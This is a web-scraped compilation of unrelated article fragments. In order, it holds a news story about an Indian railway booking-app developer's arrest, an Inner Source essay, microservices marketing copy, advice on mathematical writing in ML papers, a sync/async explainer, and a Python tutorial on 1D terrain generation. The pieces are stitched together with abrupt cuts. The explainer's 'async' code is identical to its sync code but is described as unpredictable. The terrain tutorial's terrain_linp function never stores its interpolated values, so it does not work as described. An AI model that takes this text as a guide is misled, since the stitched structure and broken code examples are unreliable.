school. Since he had topped Class XII in his district, he had a three-year scholarship of Rs 3,000 per month from the Indian government’s Defence Research and Development Organisation (DRDO).</p><p>At MIT-Chennai, Yuvarajaa met others like him who loved coding.&nbsp;&nbsp;</p><p>“We were a group of people who liked programming. When some of us went on to take up jobs, Yuvarajaa went for higher studies as he was passionate about engineering,” said Akilan, a friend and fellow aeronautical engineer who is currently working in New Jersey.&nbsp;</p><p>After graduating in 2010 from MIT Chennai, Yuvarajaa joined IIT-Kharagpur for an M. Tech in aeronautical engineering. Again, he had a scholarship, this time for topping the GATE (Graduate Aptitude Test in Engineering).&nbsp;</p><p>Once he finished his IIT course, he joined a firm in Bengaluru.&nbsp;</p><p>“In aeronautical engineering there are very few private firms which offer jobs. But he got one of the good jobs available in India,” Akilan said.&nbsp;</p><p>While working in Bengaluru, Yuvarajaa frequently booked tickets to travel home to Tirupur.&nbsp;</p><p>“It was then that I realised that the IRCTC app is terribly slow. Besides, I always wanted to develop apps and this felt like the right time,” Yuvarajaa told <em>HuffPost India</em>. “So Super Tatkal took shape.”</p><p>Super Tatkal, launched in 2016, allowed users to prefill their journey details and paste these onto the IRCTC website. This sped up the booking process by about five times the usual time it takes to book tickets on IRCTC website, said Yuvarajaa.&nbsp;</p><p>The app was buggy at first, he said, but a steady group of users kept sharing their experience.&nbsp;</p><p>“I went about correcting the bugs and realised that the app was gaining traction,” he said.&nbsp;</p><p>Super Tatkal was free for the first year. Later, as the maintenance cost of servers increased to Rs 10,000 per month, Yuvarajaa asked for user contributions — but this didn’t help much. He then decided to finance the app through in-app purchases where users were asked to buy a stack of 10 virtual coins for Rs 20. After the first three free bookings, the app charged five coins per transaction —&nbsp;ie, a nominal fee of Rs 10 per booking.</p><p>The Railway Police claims Yuvarajaa earned Rs 20 lakh through Super Tatkal between 2016 and 2020. This may sound like a big number, but it works out to about Rs 40,000 per month.</p><p>Yuvarajaa said all his users were aware of the payment model and that he had not cheated anyone into paying.&nbsp;&nbsp;</p></div><figure>
        <p><figcaption>A screengrab of the Super Tatkal Pro app before it was deactivated.</figcaption></p></figure><div><h3><strong>‘Didn’t take permission’</strong></h3><p>While Super Tatkal was taking off, Yuvarajaa soon became comfortable in the startup bubble. He quit his job in 2017 and started a truck aggregator app, Speedbird trucks, along with two of his friends.&nbsp;</p><p>“It was like an Ola or Uber for trucks. It took off well in the beginning,” Yuvarajaa said. But before the app could get traction, trouble started. It was difficult to convince people to use the trucks available on the app because existing contracts from known services seemed simpler for users.&nbsp;</p><p>“We took on lease two trucks to run the app but that ended in losses,” said Yuvarajaa. The company was built on the life savings of the three young men and it lacked a business model.&nbsp;</p><p>“To arrive at the business model one has to experiment with various models and this costs money,” said Yuvarajaa. The company also lacked a mentor, an industry insider, who could have offered steady advice and feedback.&nbsp;</p><p>“It is difficult to network and find help when you are a beginner,” he said.&nbsp;</p><p>It also didn’t have an investor. “We were at the experimental stage and could not win the confidence of an investor,” he said. In the experimental stage, startups built on little resources are mostly on their own and can only dream of reaching the patent filing stage which gets support from the Union government.&nbsp;</p><p>Meanwhile, Super Tatkal was doing relatively well. “The users kept growing and I launched a second app—Super Tatkal Pro—which allowed booking on IRCTC’s rail connect app in 2019,” he said.&nbsp;</p><p>To keep his startup alive and to support his family, Yuvarajaa also worked as a freelance programmer. The income was small but steady. However, unbeknownst to Yuvarajaa, his app was on the Railway police’s radar.&nbsp;</p><p>“RPF Cyber Cell at Southern Railway Headquarters Chennai had played a key role in analysis of data and identification of the fake app developer’s location and also collected digital evidences i.e server source code, application source code, end-users list and bank statements of the offender,” the Railway police said in their press release.</p><p>Yuvarajaa’s mistake, an officer at the security command centre of RPF told <em>HuffPost India</em>, was that “he did not obtain the needed permission from IRCTC and was working like a ticketing agent”.&nbsp;</p><p>Under the Railways Act, all those who help passengers with ticketing are expected to register with the IRCTC as an agent. Does this apply for app creators? The officer reserved his comment.&nbsp;</p><p>Yuvarajaa, however, said that he was “trying to create something of value for people” and that he “was not aware that the app would be considered illegal”. IRCTC could have sent him a warning or a cease-and-desist order before swooping in, he rued.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p><p>Arunachalam, of the Indian School of Business, said Yuvarajaa’s case points to the need for more mentorship in India’s start-up space.&nbsp;&nbsp;</p><p>“He does not seem to have understood the process well,” Arunachalam said.</p><p>Back in Tirupur, Yuvarajaa said that he hopes to work with the Railways once his legal troubles end.</p><p>Will he revive his apps if he gets the required permission from IRCTC?&nbsp;</p><p>“I would like to,” he said.</p><p><em>This story was corrected to say that Yuvarajaa was arrested on October 23 and spent about a week in jail, not a month-and-a-half.</em></p></div>

<p><em>This is the first of a series of two articles describing the reasoning and the steps behind the idea of correlating software product delivery process performance metrics with community health and collaboration metrics as a way to engage execution managers so their teams participate in Open Source projects and Inner Source programs.  </em>What you will read in these articles is an extension of a talk I gave at the event <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/" target="_blank" rel="noreferrer noopener">Inner Source Commons Fall 2020</a>.</p>



<p>Background</p>



<p>There is a very popular African proverb within the Free Software movement that says…</p>



<p>“<em>If you want to go fast, go alone. If you want to go far, go together.</em>“</p>



<p>Many of us used it for years to promote collaboration among commercial organizations over doing it internally in a fast way at the risk of reinventing the wheel, not following standards, reducing quality, etc.</p>

<p>The proverb describes an implicit <em>OR</em> relation between the traditional Open Source mindset, focused on longer term results obtained through extensive collaboration, and the traditional corporate mindset, where time-to-market is almost an obsession.</p>



<p>Early in my career I got exposed as manager (I do not code) to agile and a little later to Continuous Delivery. This second set of principles and practices had a big impact on me because of the tight and positive correlation that proposes between speed and quality. Until then, I had assumed that such correlation was negative, when one increases the other decreases or vice-versa.</p>



<p>During a long time, I also assumed unconsciously as truth the negative correlation between collaboration and speed. It was not until I started working in projects at scale when I became aware of such unconscious assumption and start question it first and challenging it later.</p>



<p>In my early years in Open Source I found myself many times discussing with executives and managers about the benefits of this “collaboration framework” and why they should adopt it. Like probably many of you, I found myself being more successful among executives and politicians than middle layer managers.</p>



<p>– “No wonder they are executives” I thought more than once back then.</p>



<p>But time prove me wrong once again.</p>



<p>Problem statement: can we go faster by going together?</p>



<p>It was not until later on in my career, when I could relate to good Open Source evangelists but specially good sales professionals. I learned a bit about how different groups within the same organization are incentivized differently and you need to understand those incentives to tune your message in a a way that they can relate to it.</p>



<p>Most of my arguments and those from my colleagues back then were focused on cost reductions and collaboration, on preventing silos, on shorten innovation cycles, on sustainability, prevention of vendor lock-in, etc. Those arguments resonate very well among those responsible for strategic decisions or those managers directly related with innovation. But they did not work well with execution managers, specially senior ones.</p>



<p>When I have been a manager myself in the software industry, frequently my incentives had little to do with those arguments. In some cases, either my manager’s incentives had little to do with such arguments despite being an Open Organization. Open Source was part of the company culture but management objectives had little to do with collaboration. Variables like productivity, efficiency, time-to-market, customer satisfaction, defects management, release cycles, yearly costs, etc., were the core incentives that drove my actions and those around me. </p>



<p>If that was the case for those organizations I was involved in back then, imagine traditional corporations. Later on I got engage with such companies which confirmed this intuition.</p>



<p>I found myself more than once arguing with my managers about priorities and incentives, goals and KPIs because, as Open Source guy, I was for some time unable to clearly articulate the positive correlation between collaboration and efficiency, productivity, cost reduction etc. In some cases, this inability was a factor in generating a collision that end up with my bones out of the organization.</p>



<p>That positive correlation between collaboration and productivity was counter-intuitive for many middle managers I know ten years ago. Still is for some, even in the Open Source space. Haven’t you heard from managers that if you want to meet deadlines do not work upstream because you go move slower? I’ve heard so many times that, as mentioned before, during years I believed it was true. It might at small scale, but at big scale, it is not necessarily true.</p>



<p>It was not until two or three years ago that I started paying attention to Inner Source. I realized that many have inherited this belief. And since they live in corporate environments, the challenge that represents convincing execution related managers is bigger than in Open Source. </p>



<p>Inner Source programs are usually supported by executives and R&amp;D departments but receive resistance from middle management, especially those closer to execution units. Collaborating with other departments might be good in the long term but it is perceived as less productive than developing in isolation. Somehow, in order to participate in Inner Source programs, they see themselves choosing between shorter-term and longer-term goals, between their incentives and those of the executives. It has little to do with their ability to “<em>get it</em>“.</p>



<p>So either their incentives are changed and they demonstrate that the organization can still be profitable, or you need to adapt to those incentives. What I believe is that adapting to those incentives means, in a nutshell, to provide a solid answer to the question, <em>can we go faster by going together?</em></p>



<p>The proposed solution: if you want to go far, together is faster.</p>



<p>If we could find a positive correlation between efficiency/productivity and collaboration, we could change the proverb above by something like…</p>

<p>And hey, technically speaking, it would still be an African proverb, since I am from the Canary Islands, right?.</p>



<p>The idea behind the above sentence is to establish an <em>AND</em> relation between speed and collaboration meeting both, traditional corporate and Open Source (and Inner Source) goals. </p>



<p>Proving such positive correlation could be help to reduce the resistance offered by middle management to practice collaboration at scale either within Inner Source programs or Open Source projects. They would perceive such participation as a path to meet those longer term goals without contradicting many of the incentives they work with and they promote among their managees.</p>



<p>So the following question is, how we can do that? how can we provide evidences of such positive correlation in a language that is familiar to those managers?</p>



<p>The solution summarized: ISC Fall 2020</p>



<p>I tried to briefly explain to people running Inner Source programs, during the <a href="https://innersourcecommons.org/events/isc-fall-2020-agenda/">ISC Fall 2020</a>, a potential path to establish such relation in five not-so-simple steps. The core slide of my presentation enumerated them as:</p>



<p>1.- In addition to collaboration and community health metrics, I recommend to track product delivery process performance ones.<br>2.- Correlate both groups of metrics.<br>3.- Focus on decisions and actions that creates a positive correlation between them.<br>4.- Create a reporting strategy to developers and managers based on such positive correlation.<br>5.- Use such strategy to turn around your Inner Source/Open Source story: it is about creating positive business impact at scale through open collaboration.</p>



<p>A detailed explanation of these five points can be found in the second article of this series:</p>

Microservices or monolithic – which is better?</strong></h3><p>If you’re about to begin a new project, you might be asking yourself whether you should go with a monolithic or microservices architecture. Or at least you should be asking yourself that question. We’re going to give you some reasons to think seriously about going with microservices.</p><h4><b>What is monolithic vs. microservices architecture?</b></h4><p>Monolithic applications are built and deployed as a single unit. This is the traditional approach to creating applications: all modules are combined in one self-contained codebase.</p><p>All developers work on the same codebase and are committed to a single development stack, including languages, libraries, tools, and everything else used to create the application. Changing any of these elements is a major challenge in a monolithic architecture. Any changes or fixes have the potential to cause problems for everyone involved.</p><p>Microservices take the opposite approach. With a microservices architecture, you divide an application into discrete components that can be developed and deployed completely separately. Any coding language can be used and the development teams can be small and autonomous. Each service represents a particular functionality in the application. If one service has a problem, it won’t take down the entire application and fixes can be quickly rolled out by the relevant team.</p><h4><b>Monolith vs. microservice: the showdown</b></h4><p>Let’s look at ten aspects of applications and see where monolithic and microservices architectures differ.</p><p><strong>1. Size</strong></p><p>A monolithic application is a single self-contained unit. Monolithic applications can get very big over time and your developers can end up dealing with a huge mass of code.</p><p>In contrast, microservices aim to be small independent services that focus on delivering a specific business objective.</p><p><strong>2. Granularity&nbsp;</strong></p><p>All the elements within a monolithic application are tightly coupled and interconnected. Changes made to any part of the application can have effects everywhere. A single bug can mean that the whole application fails.</p><p>Microservices are loosely coupled by design. If there’s a fault, they can be isolated and fixed.</p><p><strong>3. Ease of deployment</strong></p><p>Monolithic applications are not easy to deploy. Making changes can be complicated and deployment is a big deal, involving the entire application.</p><p>Microservices have small teams that can develop and deploy independently. They don’t have to coordinate with everyone else involved in the project.</p><p><strong>4. Speed of deployment&nbsp;</strong></p><p>Not only are monolithic applications more difficult to deploy – they’re also slower. It can take a lot of time to wait for all the changes to be ready and for large development teams to make sure that everything is ready to roll out. Those delays can be very costly, especially if your competitors have made the switch to microservices.</p><p>Again, microservices are designed to be the opposite. Leaner teams developing and deploying their own part of the application mean that microservices can indulge in rapid deployment. Some microservices can even go with continuous deployment and deliver really quick responses to feedback and feature requests.</p><p><strong>5. Communications volume&nbsp;&nbsp;&nbsp;</strong></p><p>Here’s where monolithic applications have an advantage over microservices. Because everything in the application is self-contained, there’s no need for remote calls between services.</p><p>Microservices can end up with significant communication overheads because of all the extra remote calls. While this isn’t catastrophic, it does mean that communication between the microservices has to be designed and managed carefully to avoid bottlenecks because of overly chatty services.</p><p><strong>6. Persistence of data</strong></p><p>All components in a monolithic application share data storage. A single database sits at the lowest level of the architecture of the application and serves information to the entire application. That’s a lot of work for one database and it can mean problems as it gets bigger over time.</p><p>One of the basic principles of microservices is that each service is free to choose its own data storage and to manage its own data. In fact, you should make sure that services don’t share a data store so that you can avoid too much unwanted coupling between services. Like with communications, this can be a challenge. You especially need to rely on domain-driven design to make sure that no microservice can modify the databases of another. Keep each microservice focused on its own business objective.</p><p><strong>7. Ease of onboarding</strong></p><p>A monolithic application can become so complex that it becomes daunting for new hires to understand it all before they get started. It can be difficult for old hands to even explain how everything works!</p><p>With microservices, your new developers just need to understand the code used for their own service. Which means you get them onboard and coding faster and safer.</p><p><strong>8. Polyglot programming</strong></p><p>With a monolithic application, you’re stuck with a single development stack for the whole thing. You can’t decide to use a different programming language for one component or experiment with new approaches to storage solutions.</p><p>Microservices give you the freedom to use a different technology stack whenever you want. You can experiment, optimize, and keep up with new ideas.</p><p><strong>9. Communication method&nbsp;&nbsp;</strong></p><p>Monolithic applications communicate with in-process calls and local method calls. As with everything else, it’s all kept internal and dependent on the language used to develop the application.</p><p>Microservices make use of APIs and a modern RESTful approach to communicating with each other. The architecture is lightweight and technology-neutral, so again you end up with more freedom.</p><p><strong>10. Scalability&nbsp;&nbsp;&nbsp;</strong></p><p>So what about when your application needs to grow?</p><p>Monolithic applications can only scale horizontally. You can run multiple copies of the application. Additional servers, additional resources, and a lot of waste.</p><p>Microservices can be scaled individually as and when needed. Fewer resources get wasted and real business objectives determine where you add them.</p><p><i>At Blocshop, we’ve both converted monolithic applications to microservices and designed and built microservices from scratch. While we believe that the benefits of microservices are clear, we also know that there are horror stories out there about companies that underestimated the task of building or migrating. </i><a href="https://www.blocshop.io/contacts/?utm_source=ebook&amp;utm_medium=microservices&amp;utm_content=contact"><i>Contact us</i></a><i> to find out how you can avoid making the same mistake.

Top advantages of microservices</b></h3><p>Starting a new project or dealing with an unmanageable behemoth of an application? It’s time to decide whether microservices are right for you. To help you make the leap, here are our top ten reasons to choose a microservices future.</p><h4><b>1. Easy and quick scalability</b></h4><p>Need to scale up – or down? It’s much easier when your services are separate. Just identify the services you really need to scale and leave the others untouched. Being able to scale dynamically means that you can grow when you have the demand, rather than trying to predict your needs at the outset.</p><h4><b>2. Leaner teams</b></h4><p>Separating services also means that you can use smaller teams that can work independently of each other. When you get to the point where you need dozens of developers, you don’t want to have to force them all to collaborate and waste time in meetings. Small, autonomous teams can operate faster and more efficiently.</p><p>An extra advantage is that it’s a lot faster to onboard new developers. That new hire no longer needs to understand absolutely everything before they can get coding. And you can try them out in less critical areas without worrying about their every keystroke.</p><h4><b>3. Enhanced productivity</b></h4><p>Those smaller teams will work a lot more efficiently, especially when your product really starts to grow. Not being forced to collaborate with absolutely everyone else lets your developers focus on their own codebase.</p><h4><b>4. Flexibility to experiment and optimize</b></h4><p>You can experiment when you know that you can add or remove features without risking the rest of your application. Want to try optimizing something? Go ahead. You can even decide to try out a new coding language or approach, safe in the knowledge that you aren’t committing to reworking the entire codebase.</p><h4><b>5. Freedom to try out new technology</b></h4><p>This level of flexibility means that you can avoid getting locked into a particular technology or language. If something better comes along, you can try it out, confident that the team involved will be able to roll back the changes smoothly if it doesn’t work out. As more modern technologies emerge, you can switch some of your services without replacing the whole application.</p><p>Microservices also enable you to use multiple languages at once. Each of your teams can choose what works best for their particular part of the project.</p><h4><b>6. Faster deployment</b></h4><p>When each of your services has its own discrete codebase, your teams can deploy faster. Each service can be deployed individually, without affecting other services or teams. Some teams might even choose to use a continuous deployment pipeline. Microservices give you the freedom to have a different deployment process for each part of your project.</p><h4><b>7. Strength in isolation</b></h4><p>If a service fails, it’s not going to take down everything else. You’ll still have to fix it, or use an alternative service, but at least you’ll be dealing with a smaller problem than if you had to debug the whole application. Make use of this fault isolation and ensure that the system can survive failures in some services. You’ll end up with a much more robust product.</p><h4><b>8. Cleaner maintenance and faster response …</b></h4></div></div></div></div></div></div></div></div></section></div></div></div></article></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <p>Having been a reviewer for numerous machine learning conferences now,
there are some repeated issues I want to point out, concerning the way
authors describe mathematical concepts in their papers. I hope that my
suggestions will serve in particular those that are new to machine
learning and for whom the task of reading a paper with a ‘bad’
mathematical style might seem a daunting prospect. Without further ado,
here are some suggestions for improving your research article.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup></p>

<p>Your primary objective when writing mathematics should be to build
intuition for readers. This does <em>not</em> mean that you should sacrifice
any rigour or precision—I am just advocating for considering that
a reader of your paper is not an expert in the subject matter yet. If
you want readers to take away some wisdom from the paper, you have to
address their intuition first. No one except an expert in your field
will be swayed by long-winded proofs.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<p>I am <em>not</em> advocating for sloppy thinking, sloppy writing, or
‘hand-waving’ in your proofs.  I am just saying that the way you lay out
your overall argument should be based on intuition, such that even
reviewers that are not experts in your domain can follow along. If you
only write a paper geared towards a very small audience, you are
reducing its impact and make your life harder because it will almost be
impossible to find good reviewers for it in the conference cycle.</p>

<p>Whenever you introduce notation, try to remain <em>consistent</em>. For
example, if you want to name three objects, prefer calling them $a$, $b$, and
$c$, instead of $\alpha$, $\mathbf{B}$, and $\mathfrak{c}^\prime$.</p>
<p>Whenever possible, follow established terminology—such as calling loss
terms $\mathcal{L}$—but do not assume that the reader is aware of
these conventions. <em>Always</em> take the time to at least briefly introduce
your notation.</p>
<p>This point is in fact closely related to the second issue, namely…</p>

<p>Some people aim to be extremely precise and <em>always</em> employ index-based
notations. For example, instead of referring to objects $a$ and $b$, it
is always $a_1$ and $a_2$ or something. There is nothing wrong with this
in principle, but I would suggest to always strive for as little index
notations as possible and, if only two objects of the same type are needed,
why not use a $\prime$ symbol (<code>\prime</code> in LaTeX) instead of indices?
This can often increase readability and makes you less error-prone
because you do not have to keep track of the indices any more. For
example, in our <a href="https://arxiv.org/abs/2011.03854">survey on graph kernels</a>,
we try to always speak of $G$ and $G^\prime$ when we need to refer to
two graphs. This leaves the indices free for when you actually <em>have</em> to
index something, for example because you are aggregating over objects
arising from a certain set.</p>
<p>In addition, try to adhere to ‘less can be more’ in other places as
well, by removing unnecessary variables, unnecessary concepts, and
unnecessary definitions. It does you credit if you want to explain
<em>everything</em> about a certain field in your paper, but if you introduce
a concept X as a special case of a concept Y, there is no need to go to
great lengths to describe any super-concept Z, unless you actually
<em>need</em> to refer to its properties. This does not mean that you should
leave out salient information—I am suggesting to <em>focus</em> on pertinent
information only. For example, there is no need to expand on properties
of metric spaces, topologies, and so on, if all you need is Lipschitz
continuity. Aim to get to the point quickly and without too many
redirections&nbsp;(unless you are writing a book, but I am assuming that
the reader of this post is interested in writing research papers).</p>
<p>Try also not to fall prey to the tendency to make your formulas more
complex than they have to be. For example, peppering your formulas with
logical quantifiers such as $\forall$ or $\exists$ is more appropriate
when you are publishing in logic. Many people, however, treat these
symbols as shortcuts. Please <em>do</em> resist that temptation. As Knuth
remarks in <a href="https://jmlr.csail.mit.edu/reviewing-papers/knuth_mathematical_writing.pdf">Mathematical Writing</a>,
the overuse of such symbols just decreases readability.</p>
<p>As a corollary to the preceding rule, do <em>not</em> include ‘cosmetic
mathematics’ in your paper.  Every equation, lemma, proposition, or
theorem should be there because it needs to be there. I know that there
is a tendency for reviewers to look favourably on a paper whose
mathematics seem ‘sufficiently complex’, but this is not the right way.
If you want to publish good papers, your first duty is to ensure that
readers of that paper can glean some insights from it. Showing off will
not help in the long run.</p>

<p>Similar to my previous post <a href="http://bastian.rieck.me/blog/posts/2019/on_writing/">on writing in general</a>,
the main thing to remember is to know your audience. In machine
learning, this audience can come from highly different backgrounds. Make
them appreciate the ideas in your paper by guiding them gently into the
mathematics. Reserve the ‘heavy stuff’ for an expert audience that can
give you some actual feedback for it instead of just skimming over it.</p>
<p>Write well, until next time!</p>
<section role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I am assuming throughout this article that your research article
is written for a machine learning conference. You might have to adjust
your writing considerably if you are a mathematician publishing for
other mathematicians—but in machine learning, many people are not
exclusively trained in mathematics, making writing research papers
a little bit more challenging if you want to do it well. <a href="#fnref:1" role="doc-backlink">↩︎</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>Whether proofs should be included in machine learning papers at
all is still a matter of debate. I think that a rigorous, principled
exposition in a paper is to be welcomed. Yet, the more our community
expands, the more we have to think about how to successfully get the
point across in our papers! At some point, there will not be
a sufficient number of expert reviewers for highly specific papers,
I fear. <a href="#fnref:2" role="doc-backlink">↩︎</a></p>

<p>“How do you distinguish between sync vs. async vs. concurrent vs. parallel?”</p>
</blockquote>
<p>It’s a question you’ll probably be asked in your first technical interview.</p>
<p>Having witnessed a lot of answers from interviewees, I see that people know the terms, but they rarely understand what they conceptually are.</p>
<p>Knowing the use cases is essential. However, just knowing the use cases also limits yourself to only those use cases. That’s why interviewers want to ask you this question⁠ - they want to see whether you’re able to introduce solutions for new use cases.</p>
<p>Now, let’s break the code.</p>
<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605595364190/9uu39gZuF.png?auto=format&amp;q=60" alt="image.png"></p>
<hr>

<p>Sync and async are two different programming models, which refer to styles of programming - how you should write code and how your code will run.</p>
<h3 id="sync">Sync</h3>
<p>In the sync programming model, you write code as steps ⁠— your code is executed from top to bottom, step by step, and it only gets to the second step when it has finished the first step.</p>
<pre><code><span><span>func</span> <span>step1</span><span>()</span></span> { <span>print</span>(<span>"1"</span>) }
<span><span>func</span> <span>step2</span><span>()</span></span> { <span>print</span>(<span>"2"</span>) }

<span><span>func</span> <span>main</span><span>()</span></span> {
    step1()
    step2()
}


</code></pre><p>Because of its predictable behavior, sync is also called a <em>predictable programming model</em>. Most programming languages use sync as its base programming model.</p>
<h3 id="async">Async</h3>
<p>In an async programming model, you write code as tasks, which are then executed concurrently. Executing concurrently means that all the tasks are likely executed at the same time.</p>
<pre><code><span><span>func</span> <span>task1</span><span>()</span></span> { <span>print</span>(<span>"1"</span>) }
<span><span>func</span> <span>task2</span><span>()</span></span> { <span>print</span>(<span>"2"</span>) }

<span><span>func</span> <span>main</span><span>()</span></span> {
    task1()
    task2()
}


</code></pre><p>As you can see in the result of the example, because tasks are executed at the same time you can not predict the result. And due to that behavior, async is also called an <em>unpredictable programming model</em>. It’s useful for use cases in which you do tasks that do not depend on each other and for which you don’t care about the execution order.</p>
<hr>

<p><img src="https://cdn.hashnode.com/res/hashnode/image/upload/v1605596051556/KfHDzfWx8.png?auto=format&amp;q=60" alt="image.png"></p>
<p>We mentioned concurrent behaviors once when discussing the async programming model. In an async programming model, tasks are treated as a single step that runs multiple tasks, and they do not care about how those tasks are ordered or run to each other. They can be run simultaneously, or, in some cases, there’ll be some tasks that run first and then pause and other tasks that come in turns, etc. That behavior is called <em>concurrent</em>.</p>
<p>Take an example in real life: There’s a challenge that requires you to both eat a whole huge cake and sing a whole song. You’ll win if you’re the fastest who sings the whole song and finishes the cake. So the rule is that you sing and eat concurrently. How you do that does not belong to the rule. You can eat the whole cake, then sing the whole song, or you can eat half a cake, then sing half a song, then do that again, etc.</p>
<p>The same applies to computer science. There are two tasks executing concurrently, but those are run in a 1-core CPU, so the CPU will decide to run a task first and then the other task or run half a task and half another task, etc. It all depends on the system architecture.</p>
<p>If we keep going with the same example, the rule is still singing and eating concurrently, but this time you play in a team of two. You probably will eat and let your friend sing (because she sings better and you eat better). So this time, the two tasks are really executed simultaneously, and it’s called <em>parallel</em>. Parallelism is a specific kind of concurrency where tasks are really executed simultaneously. In computer science, parallelism can only be achieved in multicore environments.</p>
<hr>

<p>Sync and async are programming models.</p>
<p>Concurrent and parallel are ways tasks are executed, where parallel is a narrow version of concurrent.</p>
<p>In sync, you write code as steps that are executed in order, from top to bottom. There’s no concurrency or parallelism here.</p>
<p>In async, you write code as tasks that are executed concurrently. You never know which tasks will be started first - it depends on the executing context, whether you run tasks in parallel or do a bit of one task then progress to another.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Terrains are at the heart of every Computer Game - be it Counter-Strike, Age of Empires, or even Minecraft. The virtual world that these games generate is the key to a great gaming experience. Generating terrain, manually, requires a ton of effort and hence it makes sense to auto-generate a pseudorandom terrain using some procedure. In this essay, we take a detailed look into generating pseudorandom one-dimensional terrain that is very close to real ones.</p>

<p>A one-dimensional terrain is a bunch of heights defined at every point along the X-axis. An example of this could be seen in games like Flappy Bird, Galaxy, and many more. Such terrain could also be traced as the skylines of mountain ranges.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png" alt="https://user-images.githubusercontent.com/4745789/99189082-70b55e00-2785-11eb-87c0-6d95568f709a.png"></p>
<p>The illustration above shows a one-dimensional terrain and is taken as a sketch of a distant mountain range. The procedure we define should generate terrains as close to natural ones as possible.</p>

<p>A naive solution to generate a random terrain is by using the <code>random</code> function for each point along the X-axis. The <code>random</code> function yields random values in the interval <code>[0, 1]</code>, and we map these values to the required height, for example <code>[0, 100]</code>.  The 1D terrain generation algorithm using the default random function is thus defined as</p>
<pre><code><span>import</span> random

<span><span>def</span> <span>mapv</span><span>(v, ol, oh, nl, nh)</span>:</span>
    <span>"""maps the value `v` from old range [ol, oh] to new range [nl, nh]
    """</span>
    <span>return</span> nl + (v * ((nh - nl) / (oh - ol)))

<span><span>def</span> <span>terrain_naive</span><span>(count)</span> -&gt; List[float]:</span>
    <span>"""returns the list of integers representing height at each point.
    """</span>
    <span>return</span> [
        mapv(random.random(), <span>0</span>, <span>1</span>, <span>0</span>, <span>100</span>)
        <span>for</span> i <span>in</span> range(count)
    ]
</code></pre>
<p>The <code>mapv</code> function defined above comes in very handy as it helps us to map value from a source range to a target range. The terrain generation function <code>terrain_naive</code> takes in <code>count</code> as input, suggesting the number of points along the X-axis, and it returns a list of float values representing height at each of the <code>count</code> number of points along the terrain.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png" alt="https://user-images.githubusercontent.com/4745789/99189731-9db74000-2788-11eb-98d3-0138a7378d77.png"></p>
<p>The above illustration shows the plot of the one-dimensional terrain using the above <code>terrain_naive</code> function. The terrain generated using this procedure has a lot of spikes and abrupt changes in height and it clearly does not mimic the terrains in the real world. Real-world terrains, although random, does not have a lot of sharp spikes, instead, the changes in height are very gradual and ensure some degree of smoothness.</p>
<p>In order to bring smoothness to <code>terrain_naive</code> generated terrains, we take a look at a famous estimation technique called <a href="https://en.wikipedia.org/wiki/Interpolation">interpolation</a> which estimates intermediate values given a bunch of known points.</p>

<p>Interpolation is a method of constructing new data points within a range of a discrete set of known data points. Interpolation methods estimate the intermediate data points ensuring a "smoothened" transition from one known point to another. There are several interpolation methods but we restrict our focus to <a href="https://en.wikipedia.org/wiki/Linear_interpolation">Linear</a> and <a href="https://en.wikipedia.org/wiki/Trigonometric_interpolation">Cosine</a> interpolation methods.</p>
<h3>Linear Interpolation</h3>
<p>Linear interpolation estimates the intermediate points between the known points assuming collinearity. Thus given two known points <code>a</code> and <code>b</code>, using linear interpolation, we estimate an intermediate point <code>c</code> at a relative distance of <code>mu</code> from <code>a</code> using the function defined below</p>
<pre><code><span><span>def</span> <span>linp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    <span>return</span> a * (<span>1</span> - mu) + b * mu
</code></pre>
<p>The value of the parameter <code>mu</code> ranges in the interval <code>[0, 1]</code> where <code>0</code> implies the point being estimated and interpolated is at <code>a</code> while <code>1</code> implies it is at the second point <code>b</code>.</p>
<p><img src="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png" alt="https://user-images.githubusercontent.com/4745789/99184683-d0ead680-276a-11eb-9b4d-6c78dbf3c197.png"></p>
<h3>Cosine Interpolation</h3>
<p>Linear interpolation is not always desirable as the plot sees a lot of discontinuous and sharp transitions. When the plot is expected to be smoother, it is where the Cosine Interpolation comes in handy. Instead of assuming intermediate points are collinear with the known ones, Cosine Interpolation, plots them on a cosine curve passing through the known points, providing a much smoother transition. This is could be seen in the illustration above.</p>
<pre><code><span>import</span> math

<span><span>def</span> <span>cosp</span><span>(a, b, mu)</span>:</span>
    <span>"""returns the intermediate point between `a` and `b`
    which is `mu` factor away from `a`.
    """</span>
    mu2 = (<span>1</span> - math.cos(mu * math.pi)) / <span>2</span>
    <span>return</span> a * (<span>1</span> - mu2) + b * mu2
</code></pre>
<p>The above code snippet computes and estimates intermediate point <code>c</code> at a relative distance of <code>mu</code> from the first point <code>a</code> using Cosine Interpolation. Note there are other interpolation methods, but we can solve all major of our use cases using these two.</p>

<p>We can apply interpolation to our naively generated terrain and make transitions smoother leading to fewer spikes. In the real-world, the transitions in the terrain are gradual with peaks being widespread; we can mimic the pattern by sampling <code>k</code> points from the naive terrain which could become our desired peaks, and interpolate the rest of the points lying between them.</p>
<p>This should ideally help us reduce the sudden spikes and make the terrain look much closer to really like. A simple python code that outputs linearly interpolated terrain that samples every <code>sample</code> points from the naive one is as follows</p>
<pre><code><span><span>def</span> <span>terrain_linp</span><span>(naive_terrain, sample=<span>4</span>)</span> -&gt; List[float]:</span>
    <span>"""Using naive terrain `naive_terrain` the function generates
    Linearly Interpolated terrain on sample data.
    """</span>
    terrain = []

    
    sample_points = naive_terrain[::sample]

    
    <span>for</span> i <span>in</span> range(len(sample_points)):

        
        terrain.append(sample_points[i])

        
        
        <span>for</span> j <span>in</span> range(sample - <span>1</span>):
            
            mu = (j + <span>1</span>)/sample
          
            
            a = sample_points[i]
            b = sample_points[(i + <span>1</span>) % len(sample_points)]
            v = linp(a, b, mu)

            

    
    <span>return</span> terrain
</code></pre>
